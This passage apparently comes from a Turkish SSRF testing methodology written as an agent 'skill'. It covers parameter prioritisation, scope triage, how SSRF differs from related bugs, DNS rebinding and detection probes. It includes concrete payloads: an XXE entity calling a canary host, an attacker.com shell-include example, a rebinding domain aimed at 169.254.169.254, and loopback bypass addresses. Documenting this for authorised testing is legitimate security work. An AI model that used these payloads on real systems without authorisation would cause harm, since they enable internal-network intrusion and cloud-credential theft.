kodun bu değeri okuyup **ayrıca bir dış istek** tetiklediği
gözlemlenirse test edilir — örn. bir "referans doğrulama" özelliği;
bu header'lar **çoğunlukla** SSRF ile ilgisizdir, CORS/CSRF/analytics
amaçlı okunur, kör bir SSRF payload'ı olarak denenmeleri düşük
önceliklidir).
Bu header'lar özellikle reverse-proxy/API-gateway mimarilerinde
(§12.16) ve `:authority` pseudo-header context'inde (§12.1) yüksek
önceliklidir.

**Array/çoğul parametre formu — kolayca gözden kaçan bir varyant:**
Yukarıdaki her isim, tekil formunun yanında bir **dizi/liste** olarak
da karşınıza çıkabilir — özellikle toplu import özelliklerinde
(`urls`, `urls[]`, `links[]`, `images[]`, `webhook_urls`,
`attachment_urls` gibi). Bu formların tespiti ve testi tekil forma
göre iki ek incelik gerektirir: (1) dizinin **her elemanı** ayrı
ayrı test edilmeli (yalnızca ilk/son eleman değil — bazı framework'ler
yalnızca birini işler, bkz. B27 JSON array injection), (2) dizi
formatının kendisi (`url[0]=`, `url[]=`, JSON array) hedefin
kullandığı framework'e göre değişir, context detection (§6)
sırasında bu format da ayrıca doğrulanmalıdır.

**Bilinçli olarak DIŞARIDA bırakılanlar:** `id`, `type`, `name`,
`title`, `description`, `status`, `format`, `config`, `data`,
`content`, `value`, `key`, `token` gibi son derece jenerik terimler
bu listeye **kasıtlı olarak eklenmemiştir** — nadirlik/ayırt edicilik
esastır, kapsayıcılık değil. Benzer şekilde `map_url`,
`translation_url` gibi bağlamsal olarak SSRF'e işaret etme ihtimali
düşük, çok genel görünen isimler de kasıtlı olarak eklenmemiştir —
bu isimler görülürse §2'deki endpoint-kategorisi eşleşmesine (bir
"harita"/"çeviri" özelliğinin gerçekten harici bir URL çektiği
doğrulanmışsa) bakılarak değerlendirilmelidir, isim başına otomatik
öncelik verilmez.

**Yazım biçimi notu:** Yukarıdaki terimler örnek olarak tek bir
biçimde (snake_case veya camelCase) yazılmıştır — gerçek hedeflerde
her ikisi de (`downloadUrl`/`download_url`, `imageUri`/`image_url`
gibi) görülebilir; tarama sırasında hem snake_case hem camelCase hem
de kebab-case (`download-url`) varyantları aranmalıdır, bu bir
kısıtlama değil bir hatırlatmadır.

**Bu listenin ne işe yaradığına dair kritik netleştirme — YANLIŞ
ANLAŞILMAYA AÇIK BİR NOKTA:** Bu liste bir "internette/hedefte bu adı
taşıyan her URL'i tara" listesi **değildir**. Doğru kullanım akışı
tam tersi yönde işler:

1. Recon aşamasında (§2 "Endpoint/parametre adayları nereden
   çıkarılır") **hedefin kendi** endpoint'leri/parametreleri
   toplanır (Burp geçmişi, JS bundle'ları, OpenAPI spec'i vb.).
2. Bu listedeki isimler, toplanan **gerçek** parametre adlarıyla
   eşleştirilir — örn. hedefte `POST /api/webhook {"callback_url":
   "..."}` gibi bir endpoint görülüyorsa, `callback_url` bu listeyle
   eşleştiği için risk skoruna +3 puan alır (§2 Risk skoru tablosu).
3. Payload (canary, IP-encoding varyantları vb.) **yalnızca o
   spesifik parametrenin değerine** gönderilir — liste kendisi asla
   bir hedef/URL kaynağı değildir.

**İki yönlü, birbirini tamamlayan sınır (§2'deki mevcut ilkeyle
tutarlı):**
- Liste **zorunlu bir gate değildir** — parametre adı listede
  olmayan bir aday da test edilebilir, yalnızca önceliği daha
  düşüktür (kuyrukta geriye alınır, elenmez).
- Liste **tek başına yeterli kanıt da değildir** — bir parametre
  adının listeyle eşleşmesi, o parametrenin zafiyetli olduğu
  anlamına gelmez; yalnızca "bu parametreye generic detection
  probe'u (§5) denemeye değer" anlamına gelir. Asıl zafiyet kanıtı
  hâlâ §8.4'teki evidence kurallarından gelir.

Özetle: bu liste bir **öncelik sıralaması** aracıdır, ne bir tarama
hedefi listesi ne de bir zafiyet kanıtıdır.

### Risk skoru (basit toplama modeli — örnek, standart değil)
| Sinyal | Puan |
|---|---|
| Parametre adı eşleşmesi (URL/adres deseni) | +3 |
| Endpoint kategorisi eşleşmesi | +3 |
| Parametre değeri zaten bir URL formatında (örn. `http://...` içeriyor) | +4 |
| Response header'larında outbound HTTP client imzası (`X-Forwarded-For` işleniyor, `Via` header'ı vb.) | +2 |
| Teknoloji fingerprint bilinen bir SSRF-prone framework'e işaret ediyor (§13) | +2 |
| Stored/indirect zincir şüphesi (örn. bir webhook kaydı, sonradan tetikleniyor) | +2 |

Toplam ≥5 olan (endpoint, parametre) çiftleri generic detection
kuyruğuna öncelikli alınır.

**Kritik netleştirme — bu skor bir SIRALAMA/ÖNCELİKLENDİRME
heuristiği'dir, bir eleme/gate mekanizması DEĞİLDİR:** Skor eşiğin
altında kalan (veya "parametre değeri şu an URL formatında değil"
gibi tekil bir sinyalin eksik olduğu) adaylar **atlanmaz**, yalnızca
kuyrukta daha geriye alınır. Örneğin bir `url` parametresi henüz
`http://` içermiyor diye (belki uygulama önüne sabit bir prefix
ekliyor, belki kullanıcı henüz doldurmamış) bu parametreyi test
dışı bırakmak, gerçek zafiyetleri kaçırmanın (false negative) en
sık nedenlerinden biridir — böyle bir "zorunlu önkoşul" kuralı
**kasıtlı olarak eklenmemiştir**. Zaman/request bütçesi kısıtlıysa
skor sıralamayı belirler, ama düşük skorlu bir adayın **hiç**
denenmemesi bu skill'in tasarım amacına aykırıdır.

### Duplicate önleme (agent state)

**Model düzeltmesi:** `evidence_category`, bir probe'un **sonucudur**
(çıktısı), probe'un **kimliğinin** bir parçası değildir — bu ikisini
aynı anahtar içinde tutmak, bir `target_hypothesis` değiştiğinde
(örn. AWS → GCP fingerprint güncellemesi) veya yeni bir evidence
türü aranmak istendiğinde (örn. önce reflection kontrolü yapıldı,
şimdi aynı probe'un OOB sonucu da kontrol edilmek isteniyor) gereksiz
"tekrar deneme" karmaşasına yol açabilir. Bu nedenle iki ayrı yapı
kullanılır:

**`probe_identity`** — bir probe'un **girdisini** tanımlar, tekrar
denenip denenmediğini bu belirler:

| Alan | Açıklama |
|---|---|
| endpoint | Test edilen URL/route |
| parameter | Etkilenen parametre adı |
| context | full-url / hostname-only / path-fragment / header-value / xml-entity / config-value (§6) |
| payload_family | canary-oob / ip-obfuscation / protocol-smuggling / cloud-metadata / dns-rebinding vb. |
| canonical_payload | Payload'ın normalize edilmiş/kanonik hali (bkz. §8.2.6) |
| delivery_mode | Nasıl gönderildiği: query-param / body-json / header / multipart / config-value |

**`probe_result`** — aynı `probe_identity` için elde edilen
**çıktıyı** ayrı ayrı tutar, probe'un tekrar denenip denenmeyeceğini
etkilemez:

| Alan | Açıklama |
|---|---|
| target_hypothesis | O anki lider hedef tahmini (AWS/GCP/Azure/internal-service/unknown) — değişebilir, probe'u geçersiz kılmaz |
| evidence_category | reflection/oob/timing/error-differential/stored-indirect (§8.3) — bir probe birden fazla evidence kategorisi üretebilir |
| classification | confirmed/probable/inconclusive/negative (§8.4) |

Yeni bir probe denemeden önce `probe_identity` tablosunu kontrol et —
aynı `probe_identity` daha önce denenmişse **payload'ın kendisi**
tekrar gönderilmez, ama `target_hypothesis` güncellendiğinde veya
yeni bir evidence kategorisi aranmak istendiğinde (örn. yalnızca
reflection kontrolü yapılmış bir probe için şimdi OOB kontrolü de
isteniyor) aynı `probe_identity` üzerinde **yeni bir `probe_result`
kaydı** açılabilir — bu bir "tekrar" sayılmaz, çünkü aranan kanıt
türü farklıdır.

### Çoklu Host / Wildcard Scope Triage (`*.example.com` gibi geniş kapsam)

Scope tek bir host değil bir wildcard/subdomain listesiyse (onlarca
veya yüzlerce host), aşağıdaki triage katmanı §2'deki parametre-seviyesi
risk skorunun **üstüne** eklenir. **Temel kural, tüm skill boyunca
geçerli olan aynı ilkedir: bu bir önceliklendirmedir, bir eleme
değildir — düşük öncelikli bir host asla scope'tan çıkarılmaz, yalnızca
kuyrukta daha geriye alınır.** Kaynak/zaman sonsuz değilse önce
yüksek öncelikliler test edilir, ama kaynak yeterliyse **scope'taki
her host** aynı pipeline'dan (§1 Layer modeli) geçirilir.

**1. Host-seviyesi risk skoru (parametre skoruyla aynı toplama
mantığı, ayrı bir eksen):**

| Sinyal | Puan |
|---|---|
| Subdomain adı yüksek öncelikli bir işlevi işaret ediyor (`admin.`, `api.`, `internal.`, `staging.`, `jenkins.`, `gitlab.`, `grafana.`, `webhook.` vb.) | +3 |
| Teknoloji fingerprint'i §13'teki bilinen bir SSRF-prone framework/CMS ile eşleşiyor | +3 |
| Host'ta §2'deki yüksek öncelikli endpoint kategorilerinden biri (webhook, önizleme, import, screenshot vb.) doğrudan görünüyor | +4 |
| Host, scope'taki diğer host'larla **aynı codebase/deployment** olduğu bilinen bir "sibling" (aşağıya bkz.) | +2 (kendi başına değil, bir referans host'tan devralınan bulgu varsa) |
| Host canlı ama teknolojisi/işlevi belirsiz | 0 (elenmez, yalnızca kuyrukta nötr sırada) |

Bu skor **yalnızca deneme sırasını** belirler — §2'deki parametre
skorunda olduğu gibi, düşük skorlu bir host da mutlaka test edilir,
yalnızca daha sonra.

**2. Sibling-host propagation (bulgu transferi) — en verimli teknik:**
`app1.example.com`, `app2.example.com`, `customer-a.example.com` gibi
subdomain'ler çoğunlukla **aynı kod tabanının farklı deployment'larıdır**
(multi-tenant SaaS, farklı müşteri instance'ları, farklı ortamlar).
Bu durumda:
```
1. Bir host'ta (örn. app1) bir endpoint/parametre confirmed/probable
   SSRF olarak işaretlendiğinde
2. Aynı path + aynı parametre + aynı payload, diğer sibling host'lara
   (app2, app3, ...) DOĞRUDAN denenir — sıfırdan discovery/context/
   fingerprint pipeline'ı tekrarlanmaz, çünkü aynı kod muhtemelen aynı
   sink'i taşır
3. Sibling'lerden biri FARKLI davranırsa (örn. app2'de aynı payload
   negatif dönüyorsa) bu tek başına "app2 güvenli" anlamına gelmez —
   farklı bir konfigürasyon/versiyon/WAF katmanı olabilir; app2 için
   standart pipeline (§1) sıfırdan çalıştırılmalı, sibling
   propagation yalnızca bir **hızlandırma**dır, yerine geçen bir
   "atla" mekanizması değildir.
```
**Sibling tespiti nasıl yapılır:** Aynı response header imzası/aynı
teknoloji fingerprint'i (§7), aynı sayfa yapısı/aynı statik dosya
hash'i, veya doğrudan bilinen bir multi-tenant mimarisi (örn. bir
SaaS ürününün her müşteri için `{musteri}.example.com` şeklinde
subdomain vermesi) sibling ilişkisinin göstergesidir.

**3. Paralel çalışma (§10.7'nin çoklu-host genişletmesi):** Farklı
host'lardaki generic probe'lar (§5) paralel yürütülebilir — her host
için canary'ler zaten biricik olduğundan (§9.3) OOB sonuçları
karışmaz. **interactsh-client tek bir oturumda tüm host'lar için
paylaşılabilir** — her host'a farklı bir subdomain/path segmenti
atanarak (`app1.<canary>.oast.fun`, `app2.<canary>.oast.fun` gibi)
tek bir log dosyasından hangi host'un OOB tetiklediği ayırt edilir;
host başına ayrı bir interactsh-client örneği başlatmaya gerek yoktur.

**4. State modeli genişlemesi:** `probe_identity`'deki `endpoint`
alanı zaten tam URL'i (host dahil) içerir — çoklu host senaryosunda
ek olarak bir `host_group` alanı (hangi sibling grubuna ait olduğu)
tutulması, hem duplicate-önleme hem sibling-propagation kararlarını
kolaylaştırır.

**5. Request bütçesi (§10.6) host başına ayrı düşünülür** — tek bir
host'un bütçesini tüketmesi diğer host'ların test edilmesini
engellemez; her host kendi bağımsız bütçesiyle değerlendirilir,
toplam scope büyükse öncelik yukarıdaki host-skoruna göre belirlenir.

**6. Büyük scope tek oturumda bitmiyorsa:** Bkz. §1.8 Oturumlar-Arası
Devamlılık — host-skoru ve tamamlanma durumu (`completed`/`pending`)
kalıcı bir state'e yazılarak bir sonraki oturumda kaldığı yerden
devam edilir, aynı host'lar sıfırdan taranmaz.

**Özet — kaçırılmaması gereken tek kural:** Wildcard scope'ta hiçbir
host, yalnızca "düşük öncelikli görünüyor" diye testin dışında
bırakılmaz. Triage yalnızca **hangi host'un önce** test edileceğini
belirler; kaynak/zaman yeterliyse hepsi test edilir.

---

## 3. Source → Transformation → SSRF Sink Modellemesi

Bir adayı test etmeden önce şu soruyu açıkça sor: **"Bu input gerçekten
sunucunun kendisinin başlattığı bir outbound network isteğinin hedefini
mi belirliyor, yoksa yalnızca bir istemci/tarayıcı davranışını mı
etkiliyor?"**

```
(A) SSRF'e yol açabilecek akış:
parameter → controller → HTTP client kütüphanesi (örn. Java
   HttpClient/OkHttp, Python requests, Node axios/fetch, PHP cURL)
   .get(user_input)   [sink — SUNUCUNUN KENDİSİ bu adrese bağlanır]

(B) SSRF'e yol açmayan akış (aynı parametre olsa bile):
parameter → controller → HTTP response header (Location:) →
   TARAYICI bu adrese yönlenir — sunucu hiçbir zaman bu adrese
   bağlanmaz (bu Open Redirect'tir, §3.1)
```

**Pratik ayrım testi:** Kendi kontrolündeki bir domain (interactsh,
bkz. §9.3) ver ve **sunucu tarafında** (network seviyesinde, ağ
trafiği/DNS log'u üzerinden) bir bağlantı denemesi olup olmadığını
gözlemle. Yalnızca `Location:`/`Refresh:` header'ında görünüp
tarayıcı console'unda bir client-side redirect olarak tetikleniyorsa
→ SSRF değil.

### 3.1 Open Redirect ile Ayrım

| | Open Redirect | SSRF |
|---|---|---|
| Kim bağlanıyor | **Tarayıcı/istemci** | **Sunucunun kendisi** |
| Tipik sink | `Location:` header'ı, `<meta refresh>`, `window.location` | Sunucu tarafı HTTP client kütüphanesi çağrısı |
| Saldırganın kazancı | Phishing/oltalama (kullanıcıyı kandırmak), OAuth token hırsızlığı zinciri | Internal network erişimi, cloud credential hırsızlığı, internal servis exploitation |
| Doğrulama yöntemi | Tarayıcıda/response header'da yönlendirme hedefinin gözlemlenmesi | Sunucu tarafında outbound bağlantı kanıtı (OOB/timing/response içeriği) |
| Aynı parametrede birlikte bulunabilir mi | Evet — bir `redirect_url` parametresi hem tarayıcıyı yönlendirebilir hem de sunucu tarafında ayrıca bir doğrulama/preview isteği tetikleyebilir (iki ayrı bulgu olarak raporlanmalı) | — |

**Kritik pratik fark:** Bir "redirect" parametresinin **sunucu
tarafında da** işlendiğini (örn. "hedef URL'in geçerli olup olmadığını
kontrol etmek için önce sunucu bir HEAD isteği atıyor") tespit etmek,
aynı parametreyi hem Open Redirect hem SSRF olarak iki ayrı bulgu
haline getirebilir — bu senaryo sık karşılaşılan ve raporlarken
netleştirilmesi gereken bir örtüşmedir.

### 3.2 CSRF ile Ayrım

CSRF (Cross-Site Request Forgery), kurbanın **tarayıcısını** ve
**kurbanın kendi kimlik bilgilerini** (cookie/session) kullanarak
üçüncü bir sunucuya (genelde hedef uygulamanın kendisine, farklı bir
domain'e değil) sahte bir istek yaptırmaktır — tehdit modeli **"kurbanın
tarayıcısı saldırganın seçtiği bir isteği, kurbanın kimliğiyle
gönderir"**dir. SSRF'de ise istek **hedef sunucunun kendisi**
tarafından, **sunucunun kendi ağ konumundan/kimliğinden** (cloud IAM
rolü, internal network erişimi) gönderilir. Bu iki sınıf birbirinden
tamamen farklı bir tehdit modeline sahiptir ve neredeyse hiçbir zaman
karıştırılmaz — bu skill yalnızca netlik için ayrımı burada
belgeler, ayrı bir pratik test prosedürü gerektirmez.

### 3.3 XXE-Tabanlı SSRF ile Overlap (KRİTİK — Ayrı Bir Skill'e Devir Noktası)

XML parser'ların **external entity** (harici varlık) çözümleme
özelliği, klasik bir SSRF **vektörü** olarak kullanılabilir:

```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://<canary>.oast.fun"> ]>
<root>&xxe;</root>
```

**Bu skill'in tuttuğu sınır:** Kök neden ve tespit/exploitation
metodolojisi (DTD işleme, entity expansion, parser-özgü
konfigürasyon bayrakları — `disallow-doctype-decl`,
`external-general-entities` vb.) tamamen **XML parser'a özgü**dür ve
ayrı bir XXE skill'inin kapsamındadır. **Bu skill'in kapsamı**,
XXE zinciri **sonucunda** ortaya çıkan network isteğinin **hedefini**
(internal servis, cloud metadata) test etme ve exploitation
aşamasıdır — yani XXE, bu skill için yalnızca **alternatif bir
delivery mekanizmasıdır** (tıpkı §11'de GraphQL'in bir delivery
mekanizması olarak ele alınması gibi). Pratik kural: Sink **gerçekten**
bir XML parser'ın DTD/ENTITY çözümleme mekanizması ise → önce XXE
skill'inin detection/confirmation metodolojisini uygula; XXE
confirmed olduktan **sonra**, elde edilen "harici istek attırma"
kapasitesini bu skill'deki §12 (Protokol/Hedef Profilleri) ile
birleştirerek internal network/cloud metadata hedeflemesi yap.

**Sık yapılan hata — SVG/HTML'in normal kaynak yüklemesiyle
karıştırmama:** Bir SVG dosyasındaki `<image href="...">` gibi bir
harici kaynak referansı **DTD/ENTITY işlemez** — bu, renderer'ın
kendi doğrudan href çözümlemesidir ve **XXE değildir**, doğrudan bu
skill'in kapsamındadır (ayrıntılı ayrım ve pratik test için bkz. §9.2).

### 3.4 RFI/LFI ile Ayrım

RFI (Remote File Inclusion), sunucunun uzak bir URL'i **kod olarak
çalıştırmak üzere** include etmesidir (örn. PHP'de
`include($_GET['page'])` ile `http://attacker.com/shell.php`
çekilip **çalıştırılması**) — nihai etki doğrudan RCE'dir. SSRF'de
ise sunucu hedef URL'in içeriğini yalnızca **veri olarak** işler
(bir resmi indirir, bir sayfayı render eder, bir API'ye proxy'ler) —
kod olarak çalıştırmaz. Aradaki çizgi bazen incelir: bir SSRF
zincirinin sonunda hedef içerik bir template/config dosyası olarak
**yeniden yorumlanıyorsa** (örn. bir SSRF ile internal bir config
endpoint'inden çekilen içerik uygulamanın kendi config parser'ına
besleniyorsa) bu, SSRF'nin bir **impact yükseltmesi** olarak
raporlanır (§10.4), ayrı bir RFI bulgusu olarak değil — kök neden
(sunucunun URL'e istek atması) hâlâ SSRF'dir.

### 3.5 DNS Rebinding — Ayrı Bir Sınıf Değil, Bir Bypass Tekniği

DNS rebinding (bir domain'in DNS TTL süresi çok kısa tutularak,
"validation" isteği sırasında zararsız bir IP, **asıl** istek
sırasında ise internal bir IP döndürülmesi), SSRF'nin **kendisi
değil**, "URL'i önce doğrula sonra kullan" (TOCTOU — time-of-check
to time-of-use) tarzı savunmaları atlatmak için kullanılan bir
**bypass tekniğidir**. Bu skill'de ayrı bir üst başlık olarak değil,
§8.2'deki bypass taksonomisinin bir kategorisi olarak ele alınır
(bkz. B7).

**Pratik uygulama — kendi DNS altyapısını kurmadan hazır bir
rebinding servisi kullanma:** Bazı halka açık rebinding servisleri,
domain adının kendisine hedef IP'leri encode ederek anında
kullanılabilir bir rebinding domain'i üretir — bu, kendi DNS
sunucusunu/kaydını yapılandırma ihtiyacını ortadan kaldırır:
```
make-1.2.3.4-rebind-169.254-169.254-rr.1u.ms
```
Bu domain, ardışık DNS sorgularında dönüşümlü olarak `1.2.3.4`
(zararsız/dış IP, validation adımını geçmek için) ve
`169.254.169.254` (asıl hedef) döndürür — `nslookup` ile birkaç kez
sorgulanarak davranış doğrulanabilir. **Not:** Bu tür halka açık
servislerin domain sözdizimi zamanla değişebilir/servis çevrimdışı
kalabilir — kullanmadan önce `1u.ms` (veya güncel eşdeğeri) için
`nslookup`/`dig` ile birkaç ardışık sorgu atıp gerçekten iki farklı
IP döndürdüğünü **testin başında doğrula**, format farklıysa
servisin o anki kendi dokümantasyonuna/ana sayfasına bakılmalı.

**Adım adım pratik confirmation akışı (hazır servis veya kendi
altyapınla):**
```
1. Rebinding domain'ini hazırla (1u.ms deseni veya Singularity of
   Origin ile kendi domain'in) — dönüşümlü IP çifti: (zararsız IP,
   hedef internal IP)
2. dig/nslookup ile art arda 3-5 sorgu at, domain'in gerçekten
   dönüşümlü cevap verdiğini doğrula (TTL değerinin çok düşük —
   genelde 0-1 saniye — olduğunu da not et)
3. Bu domain'i SSRF sink'ine payload olarak ver (§5 generic detection
   ile aynı canary-gönderme mantığı, ama URL SABİT kalır — TTL/DNS
   davranışı zamanla değişir, URL'in kendisi değişmez)
4. Eğer sink "önce doğrula sonra kullan" (TOCTOU) modeli
   uyguluyorsa: validation adımı muhtemelen ilk DNS cevabını (zararsız
   IP) alıp geçer; TTL süresi dolduktan SONRA yapılan asıl istek
   (uygulamanın gerçek outbound çağrısı)ikinci DNS sorgusunu tetikler
   ve bu kez internal IP dönebilir
5. Confirmation: interactsh-tabanlı standart OOB yöntemi burada
   DOĞRUDAN kullanılamaz (rebinding domain'i saldırganın interactsh
   canary'si değil, ayrı bir servis) — bunun yerine hedefin internal
   servise gerçekten ulaştığının kanıtı ya (a) response'ta internal
   servisin içeriğinin görünmesi (full SSRF) ya da (b) internal
   servis tarafında gözlemlenebilir bir yan etki (örn. bir healthcheck
   endpoint'inin loguna düşen istek, eğer buna erişim varsa) ile
   sağlanır — bu nedenle DNS rebinding genelde yalnızca **full/
   semi-blind** SSRF senaryolarında pratik bir confirmation yöntemidir,
   saf blind SSRF'te OOB (§9.3) hâlâ tercih edilen birincil yoldur.
```
Daha kontrollü/özelleştirilmiş bir rebinding senaryosu (özel TTL
değeri, üçten fazla IP arasında dönüşüm, kendi domain'ini kullanma
ihtiyacı) için **Singularity of Origin** (bkz. §15) gibi bir araç
kendi altyapını kurmayı sağlar.

**Önkoşul kontrolü — DNS pinning davranışı (KRİTİK, rebinding'in
başarısını doğrudan belirler):** DNS rebinding'in çalışması,
hedefin DNS çözümlemesini **her istekte yeniden mi yaptığı** yoksa
**bir kere çözüp sonucu önbelleğe (pin) mi aldığı**na bağlıdır —
bu, hedefin HTTP client'ına, işletim sistemi resolver'ına, ve
varsa OS-seviyesi DNS cache'ine (`nscd`, `systemd-resolved` vb.)
göre değişir:
- **Re-resolve modeli (rebinding çalışır):** Her yeni istekte (veya
  TTL süresi dolduğunda) DNS **yeniden** çözülür — validation ve
  asıl istek farklı IP'ler görebilir.
- **DNS pinning modeli (rebinding çalışmaz/zorlaşır):** İlk
  çözümlenen IP bir süre (bazen TTL'i bile göz ardı ederek, bazı
  JVM'lerin `networkaddress.cache.ttl` ayarı gibi) sabitlenir —
  validation ve asıl istek **aynı** IP'yi görür, TTL manipülasyonu
  işe yaramaz.
- **Test yöntemi:** Rebinding domain'ini kullanmadan önce, sabit
  (rebinding yapmayan) bir domain ile **iki ardışık istek** arasında
  DNS'in tekrar çözülüp çözülmediğini dolaylı olarak gözlemlemeye
  çalış (örn. domain'in TTL'ini kısa tutup iki istek arasında bir
  gecikme bırakarak, timing farkına bak) — bu önkoşul
  doğrulanmadan rebinding denemesi, negatif bir sonucun "koruma var"
  mı yoksa "pinning var, rebinding zaten hiç çalışmazdı" mı olduğunu
  ayırt edemez.

---

## 4. SSRF Sink Discovery

Parametre adlarının yanı sıra, mümkünse **sink pattern'lerini** de ara.
Kaynak koda erişim varsa (açık kaynak proje, expose `.git`, JAR/paket
dekompilasyonu, hata mesajlarında sınıf/kütüphane adı) şu tür isimler
bir sinyaldir:

- `requests.get(...)`, `urllib.request.urlopen(...)`, `httpx.get(...)`
  (Python)
- `axios.get(...)`, `fetch(...)`, `http.request(...)`,
  `node-fetch`, `got(...)` (Node.js)
- `HttpClient.send(...)`, `URLConnection.openConnection(...)`,
  `OkHttpClient`, `RestTemplate.getForObject(...)`,
  `WebClient.get()` (Java/Spring)
- `curl_exec(...)`, `file_get_contents(...)` (URL wrapper'ı açıksa),
  `fopen(..., "r")` (URL wrapper'ı açıksa) (PHP)
- `HttpClient.GetAsync(...)`, `WebRequest.Create(...)` (.NET)
- `Net::HTTP.get(...)`, `open-uri` (Ruby)

**Black-box (kaynak koda erişim yok) senaryoda** sink discovery
pratikte §2'deki attack surface taramasıyla örtüşür: yüksek öncelikli
endpoint kategorileri zaten bu sink'lerin dışarıdan gözlemlenebilir
izleridir. Response header'larında görülen HTTP client imzaları
(`User-Agent` echo'su, `Via`, `X-Forwarded-*` işleme davranışı) hem
sink discovery hem fingerprinting (§7) için aynı anda kullanılabilir.

### Konsolide Edilmiş Input-Location Haritası

Bu skill boyunca input'un gelebileceği yer (delivery mekanizması)
farklı bölümlere dağılmış durumda — aşağıdaki tablo, hangi input
konumunun nerede detaylandırıldığını tek bir yerden gösteren bir
**indeks**tir (yeni bir teknik tanımlamaz):

| Input Konumu | Detaylandırıldığı Bölüm |
|---|---|
| Query/body parametreleri (klasik) | §2 parametre listesi |
| JSON alanları (nested dahil) | §2, §6 "JSON-field context" |
| XML/SVG/DOCX/PDF içi referanslar | §9.2, §3.3 (XXE overlap) |
| Multipart/dosya içeriği | §9.2 |
| HTTP header'ları | §2 "Header-tabanlı SSRF vektörleri" (sinyal-güdümlü, bkz. not) |
| Cookie değerleri | Ayrı ele alınmamıştır — header-value context (§6) ile aynı mantık uygulanır, nadir ama olası bir vektördür |
| URL path segmentleri | §6 "path-fragment context" |
| Config/YAML/manifest değerleri | §6 "config/manifest-value context", §11 (Kubernetes/CI-CD) |
| Stored/kayıtlı alanlar (webhook vb.) | §9.1 |
| Array/çoğul formlar (`urls[]` vb.) | §2 "Array/çoğul parametre formu" |
| GraphQL argümanları | §11 GraphQL notu |
| WebSocket mesaj içeriği | Ayrı ele alınmamıştır — bir WebSocket bağlantısı kurulduktan sonra mesaj içeriğinin bir SSRF sink'ine ulaşması, uygulamaya özel bir mimari gerektirir; genel prensip aynıdır (§5 generic detection), ayrı bir protokol profili değildir |
| Reverse-proxy/gateway routing (parametre değil) | §12.16 (infrastructure-mediated, ayrı bir keşif kanalı — §1.1) |
| URL içindeki URL (örn. bir redirect/callback URL'in query string'i içinde başka bir URL) | Ayrı ele alınmamıştır — context detection (§6) sırasında fark edilmesi gereken iç içe bir örüntüdür, ayrı bir mekanizma değildir |

Bu tablo tamamlanmış bir liste değildir — amaç, "input nereden
geliyor" sorusunu sorarken hangi bölüme bakılacağını hızlıca
bulmaktır.

---

## 5. Generic SSRF Detection

### Kavramsal Zincir — Outbound Kanıtı ile Hedef Attribution Ayrı

```
Reflection (URL parametre olarak kabul ediliyor mu?)
   ↓
Parsing (URL formatı doğrulanıyor mu, hata vermiyor mu?)
   ↓
Outbound attempt (sunucu gerçekten bir bağlantı deniyor mu?)
   ↓
Reachability (bağlantı hedefe ulaşıyor mu — OOB kanıtı)
   ↓
Negatif kontrol doğrulaması (§5.1 — geçersiz bir hedef FARKLI davranıyor mu?)
   ↓
Target attribution     (hangi ağ/hedef — ayrı bir aşama, bkz. §7 Fingerprinting)
```

Bu diyagram bir kanıt **olgunlaşma** sürecini gösterir. "Confirmed"
etiketi için gereken minimum kanıt seti §8.4'te tanımlıdır.

### İlk Tarama — Kendi Kontrolündeki Domain ile Canary Probe (Birincil Yöntem)

SSRF'de "polyglot fuzzing" (SSTI/EL'deki gibi) **birincil yöntem
değildir** — SSRF'nin en güvenilir ve en düşük false-positive riskli
ilk tarama yöntemi, doğrudan **kendi kontrolündeki bir OOB domain'i**
ile canary probe göndermektir (bkz. §9.3 interactsh-client kurulumu,
test oturumunun en başında başlatılmalıdır):

```
http://<benzersiz-alt-domain>.oast.fun/
https://<benzersiz-alt-domain>.oast.fun/
```

Her aday parametreye **biricik bir subdomain/path** ile bu canary
gönderilir (örn. `param1.oast.fun`, `param2.oast.fun`) — bu, hangi
parametrenin gerçekten outbound isteği tetiklediğini birebir
eşleştirmeyi sağlar (SSTI/EL'deki "canary marker" prensibinin ağ
seviyesindeki karşılığı).

### Pozitif Sayılma Kuralı — En Az Bir Geçerli Evidence Kanalı

**Netleştirme:** Bir probe'un **outbound evidence** sayılması için
aşağıdaki iki kanaldan **en az biri** yeterlidir — ikisinin birden
bulunması gerekmez, yalnızca ikisi birden bulunursa daha güçlü bir
kanıt oluşturur (§8.3'teki gibi ayrı evidence kategorileri sayılır):

1. **Full/reflected evidence:** Hedef sunucudan (interactsh canary
   domain'inden) dönen response'un içeriği (veya bir kısmı) hedef
   uygulamanın kendi response'unda **görünüyor**.
2. **OOB evidence:** interactsh log'unda canary domain'ine gelen bir
   DNS lookup **ve/veya** HTTP isteği kaydı **var** (bkz. §9.3).

Yalnızca "parametre kabul edildi, hata vermedi" tek başına **hiçbir
evidence kategorisine girmez** — bu yalnızca P1 (parsing) kanıtıdır,
outbound attempt kanıtı değildir.

### Aşamalı Generic Probe Sırası

1. **Marker-only / format baseline:** Geçerli bir URL formatı
   (`https://example.com`) ile normal davranışı öğren.
2. **Canary — HTTP(S) doğrudan:**
   ```
   http://<canary1>.oast.fun
   https://<canary2>.oast.fun
   ```
3. **Canary — şema/format varyasyonları (parametre bir tam URL değil
   de yalnızca hostname/path bekliyor olabilir, bkz. §6 Context
   Detection):**
   ```
   <canary3>.oast.fun                    (şemasız, host-only context)
   //<canary4>.oast.fun                  (protocol-relative)
   <canary5>.oast.fun/path               (path fragment context)
   ```
4. **Localhost/internal reachability probe (P2'den kavramsal olarak
   AYRI bir soru — timing/hata farkı üzerinden dolaylı, henüz cloud
   metadata'ya geçilmeden genel bir "internal erişim var mı" testi):**

   **Gerçek loopback adresleri (RFC gereği loopback — bu grup için
   normal hedefte network stack'i istisnasız loopback'e yönlendirir):**
   ```
   http://127.0.0.1
   http://localhost
   http://[::1]
   ```
   **"Unspecified address" (`0.0.0.0`, `[::]`) — TEKNİK DÜZELTME:**
   `0.0.0.0` (IPv4) ve `[::]` (IPv6) RFC gereği **loopback değildir**,
   "belirtilmemiş adres" (unspecified/any address) anlamına gelir —
   normalde bir sunucunun **dinlediği** (bind ettiği) tüm arayüzleri
   ifade eder, bir **istemcinin bağlanacağı** bir hedef olarak
   tanımlı değildir. Ama pratikte önemli bir **istisna** vardır:
   birçok işletim sistemi/network stack'i, `0.0.0.0`'a **çıkış
   (outbound connect) hedefi** olarak bağlanma denemesini kernel
   seviyesinde loopback'e (`127.0.0.1`) yönlendirir — bu davranış
   RFC'de garanti edilmez, **işletim sistemine/network stack'ine
   özgüdür** ve bu yüzden `0.0.0.0`/`[::]` gerçek dünyada sık
   karşılaşılan, **ampirik olarak doğrulanması gereken** bir
   SSRF/loopback-bypass probe'udur — teknik olarak "loopback" değil
